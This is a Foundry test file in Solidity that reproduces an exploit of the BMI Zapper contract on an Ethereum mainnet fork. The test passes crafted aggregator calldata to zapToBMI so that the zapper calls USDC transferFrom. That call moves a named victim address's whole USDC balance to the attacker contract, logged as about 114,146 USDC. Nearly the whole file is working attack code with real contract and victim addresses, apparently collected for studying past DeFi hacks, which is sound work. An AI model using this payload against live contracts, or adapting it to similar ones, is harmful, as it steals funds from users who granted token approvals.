// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";

import "./IBmiZapper.sol";

IBmiZapper constant bmiZapper = IBmiZapper(
    0x4622aFF8E521A444C9301dA0efD05f6b482221b8
);
IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
IERC20 constant BUSD = IERC20(0x4Fabb145d64652a948d72533023f6E7A623C7C53);
address constant victim = 0x07d7685bECB1a72a1Cf614b4067419334C9f1b4d;

contract BmiZapperTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19029290 - 1);
        vm.label(address(bmiZapper), "BMIZapper");
        vm.label(address(USDC), "USDC");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        print(
            "Victim's USDC balance before exploit",
            USDC.balanceOf(victim),
            USDC.decimals()
        );

        uint256 victimBalance = USDC.balanceOf(victim);

        address[] memory bmiConstituents = new address[](0); // Empty bmiConstituents array
        uint256[] memory bmiConstituentsWeightings = new uint256[](1);
        bmiConstituentsWeightings[0] = 1e18; // 100% weighting for demonstration

        // Craft malicious data to call a transferFrom function in the USDC token contract
        bytes memory maliciousCallData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            victim,
            address(this),
            victimBalance
        );

        // Call zapToBMI with malicious aggregator data

        bmiZapper.zapToBMI(
            address(BUSD), // _from
            0, // _amount
            address(0), // _fromUnderlying
            0, // _fromUnderlyingAmount
            0, // _minBMIRecv
            bmiConstituents,
            bmiConstituentsWeightings,
            address(USDC), // _aggregator
            maliciousCallData, // _aggregatorData
            true
        );

        print("Victim's USDC balance after", USDC.balanceOf(victim), 6);
        print(
            "Attacker's USDC balance after",
            USDC.balanceOf(address(this)),
            6
        );
        // Attacker's USDC balance after: 114146.247097
    }
}
